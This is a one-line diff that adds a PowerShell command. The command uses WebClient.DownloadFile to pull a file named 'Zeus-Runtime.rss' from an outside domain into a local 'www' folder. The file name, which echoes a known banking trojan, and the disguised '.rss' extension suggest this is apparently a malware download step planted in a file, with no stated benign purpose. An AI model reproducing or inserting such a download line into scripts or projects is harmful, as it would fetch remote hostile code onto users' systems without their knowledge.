@@ -1,0 +1,1 @@
+(new-object System.Net.WebClient).DownloadFile( 'https://gms.magecorn.com/Zeus-Runtime.rss','www\Zeus-Runtime.rss')
